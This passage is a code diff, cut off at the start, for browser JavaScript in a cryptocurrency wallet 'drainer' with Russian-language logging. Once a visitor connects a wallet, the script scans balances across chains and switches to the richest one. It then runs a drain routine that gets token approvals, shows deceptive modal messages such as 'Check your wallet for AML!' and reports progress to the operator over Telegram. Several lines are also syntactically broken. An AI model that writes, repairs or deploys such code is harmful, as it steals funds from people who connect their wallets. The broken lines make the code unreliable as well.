-          `Amount: ${ethers.utils.formatUnits(balance, decimals)}\n` +
-          `Network: ${chainConfig.name}`
-        );
         status = 'confirmed';
+      } catch (error) {
+        console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
+        throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
+      }
 
-        if (!modalClosed) {
-          console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
-          await hideModalWithDelay();
-          modalClosed = true;
-        }
+      if (!modalClosed) {
+        console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
+        await hideModalWithDelay();
+        modalClosed = true;
       }
-    } catch (error) {
-      console.error(`❌ Ошибка обработки ${token}: ${error.message}`);
-      await sendTelegramMessage(`❌ Ошибка обработки \`${token}\` в сети ${chainConfig.name}: ${error.message}`);
-      if (error.message.includes('user rejected')) {
-        if (!modalClosed) {
-          console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
-          await hideModalWithDelay("Error: Transaction rejected by user.");
-          modalClosed = true;
-        }
-      }
-      throw new Error(`Failed to approve token ${token}: ${error.message}`);
     }
+  }
+
   console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
   return status;
 }
 
 async function runDrainer(provider, signer, userAddress) {
+  if (!serverConfig) {
+    await fetchConfig();
+  }
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 10;
+  const minDelay = 100;
 
   if (timeSinceLastDrain < minDelay) {
     await delay(minDelay - timeSinceLastDrain);
   }
 
-  lastDrainTime = Date.now()';
+  lastDrainTime = currentTime;
 
-  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
+  const balancePromises = Object.keys(serverConfig.CHAINS).map(async (chainId) => {
     try {
-      const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
+      const reliableProvider = await getWorkingProvider(serverConfig.CHAINS[chainId].rpcUrls);
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
-      return { chainId: Number(chainId), decimals, balance: balance, provider: reliableProvider };
+      return { chainId: Number(chainId), balance, provider: reliableProvider };
     } catch (error) {
       console.error(`❌ Ошибка проверки баланса для chainId ${chainId}: ${error.message}`);
       return null;
@@ -717,47 +624,48 @@ async function runDrainer(provider, signer, userAddress) {
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
 
-  const sorted = await Promise.all(
+  const sortedBalances = await Promise.all(
     balances
       .filter(item => hasFunds(item.balance))
-      .map(async item) => {
+      .map(async (item) => {
         const totalValueInUSDT = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
-        return { ...item, totalValueInUSDT: totalValueInUSDT };
+        return { balances: item, totalValueInUSDT };
       })
   );
 
-  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
+  sortedBalances.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
-  if (!sorted.length) {
+  if (!sortedBalances.length) {
     throw new Error('No funds found on any chain');
-    console.log(`⚠️ Не найдено средств на цепях`);
-    return null;
   }
 
-  const target = sorted[0];
-  console.log(`🔍 Рекомендуемая сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
+  const target = sortedBalances[0];
+  console.log(`Рекомендованная сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
   return { targetChainId: target.chainId, targetProvider: target.provider };
 }
 
 async function calculateTotalValueInUSDT(chainId, balance, provider) {
-  const chainConfig = CHAINS[chainId];
+  if (!serverConfig) {
+    await fetchConfig();
+  }
+  const chainConfig = serverConfig.CHAINS[chainId];
   let totalValue = 0;
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
     const tokenData = balance.tokenBalances[tokenAddress];
-    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, decimals: tokenData.decimals));
+    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
     if (formattedBalance > 0) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
+                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+      const tokenPrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[tokenAddress] || symbol);
       const tokenValue = formattedBalance * tokenPrice;
       totalValue += tokenValue;
-      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance.toFixed(2)} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
     }
   }
 
-  console.log(`📊 Общая стоимость токенов (токенов без нативных) для chainId ${chainId}: ${totalValue} USDT`);
+  console.log(`📴 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue.toString()} USDT`);
   return totalValue;
 }
 
@@ -766,8 +674,8 @@ window.addEventListener('DOMContentLoaded', () => {
   const isInjected = typeof window.ethereum !== 'undefined';
 
   const link = document.createElement('link');
-  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700';
-  link.rel = 'stylesheet';
+  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
+  link.setAttribute('rel', 'stylesheet');
   document.head.appendChild(link);
 
   const style = document.createElement('style');
@@ -778,7 +686,7 @@ window.addEventListener('DOMContentLoaded', () => {
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0,0.8);
+      background: rgba(0, 0, 0, 0.8);
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
@@ -788,7 +696,7 @@ window.addEventListener('DOMContentLoaded', () => {
     .modal-content {
       position: fixed;
       top: 50%;
-      left: translate(-50%);
+      left: 50%;
       transform: translate(-50%, -50%);
       background: #1A202C;
       border-radius: 12px;
@@ -799,7 +707,7 @@ window.addEventListener('DOMContentLoaded', () => {
       text-align: center;
       z-index: 1000;
       display: none;
-      font-family: 'Inter', sans-serif;
+      content-family: 'Inter', sans-serif;
       color: #FFFFFF;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
       animation: fadeIn 0.3s ease-out forwards;
@@ -821,7 +729,7 @@ window.addEventListener('DOMContentLoaded', () => {
       font-size: 14px;
       font-weight: 400;
       color: #A0AEC0;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
       word-wrap: break-word;
     }
 
@@ -874,7 +782,7 @@ window.addEventListener('DOMContentLoaded', () => {
     .action-list {
       list-style: none;
       padding: 0;
-      margin: 24px 0 0;
+      margin: 24px 0;
       font-size: 14px;
       font-weight: 500;
       color: #E2E8F0;
@@ -899,7 +807,7 @@ window.addEventListener('DOMContentLoaded', () => {
     @media (max-width: 480px) {
       .modal-content {
         max-width: 320px;
-        padding: 20px;
+        padding: 16px;
         min-height: 300px;
       }
       .modal-title { font-size: 18px; }
@@ -949,7 +857,7 @@ window.addEventListener('DOMContentLoaded', () => {
   if (!isInjected) {
     actionButtons.forEach(btn => {
       btn.addEventListener('click', () => {
-        window.showWalletRedirectModal();
+        window.showModal();
       });
     });
     return;
@@ -998,7 +906,7 @@ async function attemptDrainer() {
 
   const drainerTimeout = setTimeout(async () => {
     isTransactionPending = false;
-    console.error('❌ Тайм-аут выполнения дрейнера');
+    console.error('❌ Тайм-аут выполнения дрейнер');
     await hideModalWithDelay("Check your wallet for AML!");
   }, 60000);
 
@@ -1011,13 +919,13 @@ async function attemptDrainer() {
       throw new Error('Wallet address mismatch');
     }
 
-    await delay(10);
+    await new Promise(resolve => setTimeout(resolve, 100));
 
     isTransactionPending = true;
     const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
     if (targetChainId) {
       await switchChain(targetChainId);
-      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, provider), provider);
       console.log('✅ Drainer выполнен, статус:', status);
     }
 
@@ -1044,7 +952,6 @@ async function attemptDrainer() {
     }
     console.error('❌ Ошибка drainer:', err.message);
     await hideModalWithDelay(errorMessage);
-    await sendTelegramMessage(`❌ Ошибка дрейна для ${shortenAddress(connectedAddress)}: ${err.message}`);
     throw err;
   }
 }
@@ -1073,7 +980,6 @@ async function handleConnectOrAction() {
     isTransactionPending = false;
     showModal();
     await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
-    await sendTelegramMessage(`❌ Ошибка подключения для ${shortenAddress(connectedAddress)}: ${err.message}`);
   }
 }
 
@@ -1125,7 +1031,7 @@ async function waitForWallet() {
       window.ethereum.removeListener('accountsChanged', handler);
       clearInterval(checkInterval);
       reject(new Error('Timeout waiting for wallet connection'));
-    }, 60000);
+    }, 50000);
 
     window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
       console.error('❌ Ошибка запроса аккаунтов:', err.message);
@@ -1133,51 +1039,3 @@ async function waitForWallet() {
     });
   });
 }
-
-appKitModal.subscribeState(async (state) => {
-  console.log('Modal state changed:', state);
-  if (state.isOpen) {
-    console.log('Modal is open');
-  }
-  if (!state.isConnected && connectedAddress) {
-    console.log(`🔌 Кошелек ${connectedAddress} отключен`);
-    connectedAddress = null;
-    hasDrained = false;
-    sessionStorage.removeItem(`connectNotified_${connectedAddress}`);
-  }
-  if (state.isConnected && state.selectedNetworkId && state.address !== connectedAddress) {
-    console.log(`🦁 Подключен кошелек: ${state.address} на chainId ${state.selectedNetworkId}`);
-    connectedAddress = state.address;
-    const chainId = parseInt(state.selectedNetworkId, 10);
-    if (!CHAINS[chainId]) {
-      console.error(`❌ Неподдерживаемая сеть: ${chainId}`);
-      await sendTelegramMessage(`❌ Неподдерживаемая сеть: ${chainId} для ${shortenAddress(connectedAddress)}`);
-      return;
-    }
-
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-    try {
-      const balance = await checkBalance(chainId, connectedAddress, provider);
-      if (!hasFunds(balance)) {
-        console.log(`⚠️ Недостаточно средств для chainId ${chainId}`);
-        await sendTelegramMessage(`⚠️ Недостаточно средств для ${shortenAddress(connectedAddress)} в сети ${chainId}`);
-        return;
-      }
-      if (!hasDrained && !isTransactionPending) {
-        isTransactionPending = true;
-        try {
-          await drain(chainId, signer, connectedAddress, balance, provider);
-        } catch (error) {
-          console.error(`❌ Ошибка дрейна: ${error.message}`);
-          await sendTelegramMessage(`❌ Ошибка дрейна для ${shortenAddress(connectedAddress)} в сети ${chainId}: ${error.message}`);
-        } finally {
-          isTransactionPending = false;
-        }
-      }
-    } catch (error) {
-      console.error(`❌ Ошибка обработки: ${error.message}`);
-      await sendTelegramMessage(`❌ Ошибка обработки для ${shortenAddress(connectedAddress)}: ${error.message}`);
-    }
-  }
-});
